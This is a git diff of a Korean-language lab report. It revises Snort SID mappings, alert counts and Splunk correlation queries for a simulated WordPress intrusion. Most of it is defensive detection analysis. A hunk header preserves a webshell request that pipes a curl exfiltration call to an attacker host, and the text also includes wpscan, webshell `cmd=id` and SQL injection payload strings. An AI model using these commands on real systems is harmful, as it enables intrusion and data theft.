@@ -70,7 +70,8 @@ wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --f
 > **참고:** WordPress siteurl이 내부 IP(10.0.10.80)로 설정되어 있어 NAT 접근 시 301 리다이렉트 발생. Effective URL이 Bee-box(:80)로 변경됨. 일부 결과는 Bee-box와 혼재될 수 있음.
 
 **탐지 확인:**
-- Snort: SID 1000009 WPScan User-Agent 탐지 — **1,978 이벤트** (Splunk index=pfsense 확인)
+- Snort: **pfSense SID 1000001** "LOCAL WordPress wpscan detected" — **1,973 이벤트** (Splunk `index=pfsense "1000001"` 확인)
+- 참고: git local.rules SID 1000009와 pfSense 배포 SID가 다름 (아래 SID 매핑 참조)
 
 ---
 
@@ -231,27 +232,34 @@ curl -s 'http://10.0.0.254:8080/?cmd=curl+http://10.50.50.30:8888/exfil+-d+test+
 
 `phase2.5-setup/configs/snort/local.rules`에 정의된 9개 룰 적용 후 탐지 테스트.
 
-| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 |
-|-----|---------|-----------|----------|
-| 1000001 | WP Login Brute Force | 인증 공격 | ✅ **1,978 이벤트** — hydra 브루트포스 탐지 |
-| 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ **8 이벤트** — xmlrpc.php 접근 탐지 |
-| 1000003 | PHP File Upload | 지속성 | ❌ **미탐지** — 실제 공격이 multipart 파일업로드가 아닌 Code Editor 편집 경로 사용 |
-| 1000004 | PHTML WAF Bypass | 지속성 | ❌ **미탐지** — .phtml 업로드 대신 기존 hello.php 직접 편집 |
-| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ **미탐지** — WordPress→MySQL 3306 정상 통신만 발생 (3306 제외 룰) |
-| 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ **미탐지** — 관리망(10.0.50.0/24) 접근 시도 없음 |
-| 1000007 | Webshell Output | 지속성 | ✅ **탐지 (17건)** — `id` 명령 응답에 uid=/gid= 포함 |
-| 1000008 | WP File Manager CVE | 초기 침투 | ❌ **미탐지** — connector.minimal.php 직접 접근 대신 WP 관리자 UI 경유 |
-| 1000009 | WPScan Detection | 정찰 | ✅ **1,978 이벤트** — wpscan User-Agent 탐지 |
+> **⚠️ 중요: pfSense 실제 SID와 git local.rules SID가 다름**
+>
+> pfSense에 배포된 Snort 룰의 SID 번호와 메시지가 git 파일과 다르게 매핑되어 있음.
+> Splunk 검색 시 반드시 **pfSense 실제 SID**를 사용해야 함.
+>
+> | pfSense SID | pfSense 실제 메시지 | git SID | git 메시지 |
+> |---|---|---|---|
+> | **1000001** | LOCAL WordPress wpscan detected | 1000009 | WPScan Scanner Detected |
+> | **1000002** | LOCAL WordPress login brute-force attempt | 1000001 | WP Login Brute Force |
+> | **1000004** | LOCAL SQL Injection attempt UNION SELECT | — | (git에 없는 룰) |
+> | **1000006** | LOCAL Webshell access attempt | 1000007 | Webshell Command Output |
 
-> **검증 방법:** pfSense > Services > Snort > Alerts 탭에서 각 SID 경보 확인.  
-> Splunk에서 교차 확인: `index=pfsense "[LOCAL]"` 으로 커스텀 룰 경보만 필터링.
+**탐지 결과 (pfSense 실제 SID 기준):**
+
+| pfSense SID | 실제 메시지 | 킬체인 단계 | 탐지 결과 |
+|---|---|---|---|
+| 1000001 | WordPress wpscan detected | 정찰 | ✅ **1,973 이벤트** — wpscan User-Agent 탐지 |
+| 1000002 | WordPress login brute-force attempt | 인증 공격 | ✅ **8 이벤트** — hydra 브루트포스 탐지 |
+| 1000004 | SQL Injection attempt UNION SELECT | 초기 침투 | ✅ **3 이벤트** — sqlmap UNION SELECT 탐지 |
+| 1000006 | Webshell access attempt | 지속성 | ✅ **17 이벤트** — 웹쉘 명령 실행 탐지 |
+| 기타 | (1000003,1000005,1000007~1000009) | — | ❌ **미탐지 (0건)** |
+
+> **검증 방법:** pfSense > Services > Snort > Alerts 탭에서 각 SID 경보 확인.
+> Splunk 교차 확인: `index=pfsense "LOCAL"` 으로 커스텀 룰 경보만 필터링 → 총 **2,001건**.
 >
-> **핵심 발견:** 9개 룰 중 **4개(1000001, 1000002, 1000007, 1000009)만 탐지**, 5개 미탐지.  
-> 원인: 설계 시 가정한 공격 경로(CVE-2020-25213 직접 익스플로잇)와 실제 공격 경로(관리자 인증 → 플러그인 편집)가 달랐음.  
+> **핵심 발견:** pfSense에 등록된 커스텀 룰 중 **4개 SID(1000001, 1000002, 1000004, 1000006)만 탐지**, 나머지 미탐지.
+> 원인: 설계 시 가정한 공격 경로(CVE-2020-25213 직접 익스플로잇)와 실제 공격 경로(관리자 인증 → 플러그인 편집)가 달랐음.
 > 이는 **시그니처 기반 IDS의 근본적 한계** — 동일 목표를 다른 경로로 달성하면 탐지 실패.
->
-> **참고:** Splunk 경보에서 웹쉘 탐지가 SID 1000006으로 기록됨 (Git local.rules의 SID 1000007과 다름).
-> pfSense 배포 시 룰 순서/SID가 재배치된 것으로 추정. 실제 탐지 내용(Webshell 관련)은 동일.
 
 ---
 
@@ -493,19 +501,18 @@ index=pfsense "WPScan Scanner Detected"
 
 ### 2-2. Snort SID 탐지 결과 요약
 
-| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 | 경보 건수 | 미탐지 원인 |
-|-----|---------|-----------|----------|---------|-----------|
-| 1000001 | WP Login Brute Force | 인증 공격 | ✅ 탐지 | 1,978건 | — |
-| 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ 탐지 | 8건 | — |
-| 1000003 | PHP File Upload | 지속성 | ❌ 미탐지 | 0건 | multipart 업로드 대신 Code Editor 편집 |
-| 1000004 | PHTML WAF Bypass | 지속성 | ❌ 미탐지 | 0건 | .phtml 업로드 자체 미발생 |
-| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ 미탐지 | 0건 | 허용 포트(3306)만 이용 |
-| 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ 미탐지 | 0건 | 관리망 접근 시도 없음 |
-| 1000007 | Webshell Output | 지속성 | ✅ 탐지 | 17건 | — |
-| 1000008 | WP File Manager CVE | 초기 침투 | ❌ 미탐지 | 0건 | admin-ajax.php 경유, URI 불일치 |
-| 1000009 | WPScan Detection | 정찰 | ✅ 탐지 | 1,978건 | — |
+**pfSense 실제 SID 기준 (Splunk 검증 완료):**
 
-> **탐지율: 4/9 (44%)** — 시그니처가 정확히 일치하는 공격만 탐지, 우회 경로에 취약
+| pfSense SID | 실제 메시지 | 킬체인 단계 | 탐지 결과 | 경보 건수 |
+|---|---|---|---|---|
+| 1000001 | LOCAL WordPress wpscan detected | 정찰 | ✅ 탐지 | **1,973건** |
+| 1000002 | LOCAL WordPress login brute-force attempt | 인증 공격 | ✅ 탐지 | **8건** |
+| 1000004 | LOCAL SQL Injection attempt UNION SELECT | 초기 침투 | ✅ 탐지 | **3건** |
+| 1000006 | LOCAL Webshell access attempt | 지속성/행동 | ✅ 탐지 | **17건** |
+| 기타 | SID 1000003, 1000005, 1000007~1000009 | — | ❌ 미탐지 | **0건** |
+
+> **탐지 통계:** 총 2,001건 / 4개 SID 탐지, 나머지 미탐지
+> **탐지율: 4개 SID 탐지** — 시그니처가 정확히 일치하는 공격만 탐지, 우회 경로에 취약
 
 **커스텀 룰 전체 확인 쿼리 (Splunk):**
 ```spl
@@ -532,7 +539,7 @@ index=pfsense "[LOCAL]"
 ```spl
 index=idx_web "wp-login.php"
 | eval source="Apache"
-| append [search index=pfsense "1000001" | eval source="Snort"]
+| append [search index=pfsense "1000002" | eval source="Snort"]
 | stats count by source
 ```
 
@@ -541,10 +548,13 @@ index=idx_web "wp-login.php"
 탐지 소스 | 건수
 ----------|------
 Apache    | 317   (wp-login.php 접근 로그)
-Snort     | 1,973 (SID 1000001 경보)
+Snort     | 8     (pfSense SID 1000002 "brute-force attempt" 경보)
 ```
 > 동일 브루트포스 공격이 웹 서버(Apache)와 IDS(Snort) 양쪽에서 모두 탐지됨.
-> Snort 건수가 더 많은 이유: threshold 기반 경보가 반복 집계된 결과.
+> Apache 317건은 WPScan+Hydra의 모든 wp-login.php 접근, Snort 8건은 threshold 초과 분만 경보.
+>
+> 참고: 이전 쿼리에서 SID "1000001"로 1,973건이 나왔던 것은 WPScan 탐지 룰(pfSense SID 1000001)이었음.
+> 브루트포스 전용 Snort 룰은 pfSense SID 1000002.
 
 ---
 
@@ -599,37 +609,36 @@ index=idx_web sourcetype="apache:access"
 
 #### 상관분석 4. 킬체인 타임라인 재구성
 
+**4단계 타임라인 (Snort 경보만, pfSense 실제 SID 기준):**
 ```spl
-(index=pfsense "[LOCAL]" src_ip=10.50.50.30)
-  OR (index=idx_web clientip=10.50.50.30)
-  OR (index=idx_waf src_ip=10.50.50.30)
-| eval event_type=case(
-    match(_raw,"WPScan"),          "① 정찰(WPScan)",
-    match(_raw,"sql|SQL|942"),     "② SQLi",
-    match(_raw,"Brute Force"),     "③ 브루트포스",
-    match(_raw,"File Manager"),    "④ CVE 파일매니저",
-    match(_raw,"phtml|PHP Upload"),"⑤ 웹쉘 업로드",
-    match(uri,"cmd="),             "⑥ 웹쉘 실행",
-    match(_raw,"Inner-net"),       "⑦ 내부 정찰",
-    match(_raw,"Management"),      "⑧ 관리망 접근",
-    true(),                        "기타")
-| timechart span=5m count by event_type
+index=pfsense ("1000001" OR "1000002" OR "1000004" OR "1000006")
+| eval phase=case(
+    like(_raw,"%1000001%"),"1_WPScan",
+    like(_raw,"%1000002%"),"2_BruteForce",
+    like(_raw,"%1000004%"),"3_SQLi",
+    like(_raw,"%1000006%"),"4_Webshell")
+| timechart span=5m count by phase
 ```
 
-> Visualization: **Line Chart** — 공격 단계별 시간대 분포 확인
+> Visualization: **Column Chart** — 공격 단계별 시간대 분포 확인
 
-**예상 타임라인 (2026-08-26 기준):**
+**실제 결과 (2026-08-26 KST 기준):**
 ```
-시각       | 주요 이벤트
-03:00~     | ① 정찰(WPScan) — 1,978건 집중
-03:05~     | ② SQLi 시도 — 18건
-03:05~06   | ③ 브루트포스 — hydra 13회
-03:06~     | ⑥ 웹쉘 실행 — /?cmd= 다수
-03:07~     | DB 접근 — MySQL 쿼리 (Snort 미탐지)
-03:08~     | 유출 시도 — curl 차단 (Snort 미탐지)
+시각 (KST)     | 공격 단계         | 건수  | 설명
+15:35~15:40    | 1_WPScan          | 1,973 | wpscan --force 정찰 (약 4분간 집중)
+16:05          | 2_BruteForce      | 8     | hydra wp-login.php 브루트포스
+16:08~16:11    | 3_SQLi            | 3     | sqlmap UNION SELECT 시도
+17:55~18:01    | 4_Webshell        | 17    | 웹쉘 명령 실행 (whoami, id, DB접근 등)
 ```
-> Splunk에서 실행하여 실제 시간대별 분포 확인 후 갱신하세요.
-> Visualization을 **Line Chart**로 설정하면 킬체인 단계별 시간 흐름이 가시적으로 보입니다.
+> WPScan이 1,973건으로 차트를 압도하므로, 나머지 3단계만 볼 때는 "1000001" 제외:
+> ```spl
+> index=pfsense ("1000002" OR "1000004" OR "1000006")
+> | eval phase=case(like(_raw,"%1000002%"),"2_BruteForce",like(_raw,"%1000004%"),"3_SQLi",like(_raw,"%1000006%"),"4_Webshell")
+> | timechart span=5m count by phase
+> ```
+>
+> 킬체인 시간 흐름: **정찰(15:35) → 브루트포스(16:05) → SQLi(16:08) → 웹쉘(17:55)**
+> 약 2시간 20분에 걸쳐 공격 단계가 순차적으로 진행됨.
 
 ---
 
@@ -676,29 +685,28 @@ index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
 #### 상관분석 7. 고위험 IP 종합 스코어링
 
 ```spl
-(index=pfsense "[LOCAL]" OR index=idx_web OR index=idx_waf)
-| eval attacker=coalesce(src_ip, clientip)
+index=pfsense ("1000001" OR "1000002" OR "1000004" OR "1000006")
 | eval score=case(
-    match(_raw,"Brute Force"),  3,
-    match(_raw,"File Upload"),  5,
-    match(_raw,"phtml"),        5,
-    match(_raw,"CVE"),          5,
-    match(_raw,"cmd="),         8,
-    match(_raw,"SQL|sql"),      3,
-    true(),                     1)
-| stats sum(score) as risk_score, count as event_count by attacker
-| where risk_score > 10
+    like(_raw,"%1000001%"), 1,
+    like(_raw,"%1000002%"), 3,
+    like(_raw,"%1000004%"), 5,
+    like(_raw,"%1000006%"), 8)
+| eval phase=case(
+    like(_raw,"%1000001%"), "WPScan",
+    like(_raw,"%1000002%"), "BruteForce",
+    like(_raw,"%1000004%"), "SQLi",
+    like(_raw,"%1000006%"), "Webshell")
+| stats sum(score) as risk_score, count as event_count, values(phase) as attack_phases by host
 | sort -risk_score
-| rename attacker as "의심 IP", risk_score as "위험 점수", event_count as "이벤트 수"
 ```
 
 **예상 결과:**
 ```
-의심 IP         | 위험 점수 | 이벤트 수 | 평가
-10.50.50.30     | 5,900+    | 3,900+    | 고위험 (브루트포스 1,978 × 3 + WPScan 1,978 × 1 + SQLi + 웹쉘)
+host          | 위험 점수 | 이벤트 수 | 공격 단계
+10.0.100.1    | 2,150+    | 2,001     | WPScan(1,973×1) + BruteForce(8×3) + SQLi(3×5) + Webshell(17×8)
 ```
-> 실제 점수는 Splunk에서 쿼리 실행 후 확인.
-> 정상 트래픽 IP(10.0.50.17 mng-mint)의 점수가 0 또는 매우 낮아야 오탐 없음 확인.
+> 점수 가중치: WPScan=1(정찰), BruteForce=3(침투시도), SQLi=5(취약점공격), Webshell=8(실행/C2)
+> 실제 점수는 Splunk에서 실행 후 확인.
 
 ---
 
@@ -742,13 +750,13 @@ index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
 
 ### 탐지된 경보의 정탐/오탐 판별
 
-| 경보 SID | 경보 메시지 | 건수 | 판별 | 판단 근거 |
-|---------|-----------|------|------|---------|
-| 1000009 | WPScan Scanner Detected | 1,978 | **정탐** | wpscan UA `WPScan v3.x`가 모든 요청 헤더에 포함. 공격 도구 확정. |
-| 1000001 | WP Login Brute Force | 1,978 | **정탐** | hydra가 30초간 13회 POST 시도 (threshold 5회/분 초과). Apache access.log와 시각 일치. |
-| 1000002 | XML-RPC Brute Force | 8 | **정탐** | wpscan 정찰 중 xmlrpc.php 접근. `wp.getUsersBlogs` body 패턴 확인. |
-| 1000007 | Webshell Command Output | 17건 | **정탐** | `/?cmd=id` 응답에 `uid=33(www-data) gid=33(www-data)` 포함. 웹쉘 실행 확정. |
-| - | ET WEB_SERVER SQL Injection | 18 | **정탐** | sqlmap UA + SQL 페이로드(`UNION SELECT`, `OR 1=1`). 자동화 도구 확정. |
+| pfSense SID | 경보 메시지 | 건수 | 판별 | 판단 근거 |
+|---|---|---|---|---|
+| 1000001 | LOCAL WordPress wpscan detected | 1,973 | **정탐** | wpscan UA `WPScan v3.x`가 모든 요청 헤더에 포함. 공격 도구 확정. |
+| 1000002 | LOCAL WordPress login brute-force attempt | 8 | **정탐** | hydra가 wp-login.php POST 반복 (threshold 초과). Apache access.log 317건과 시각 일치. |
+| 1000004 | LOCAL SQL Injection attempt UNION SELECT | 3 | **정탐** | sqlmap UNION SELECT 페이로드 탐지. 자동화 도구 확정. |
+| 1000006 | LOCAL Webshell access attempt | 17 | **정탐** | `/?cmd=id` 등 웹쉘 명령 실행 탐지. 웹쉘 C2 활동 확정. |
+| — | ET WEB_SERVER SQL Injection (ET 룰) | 18 | **정탐** | sqlmap UA + SQL 페이로드(`UNION SELECT`, `OR 1=1`). 자동화 도구 확정. |
 
 ### 미탐지 공격의 분석 (False Negative)
 
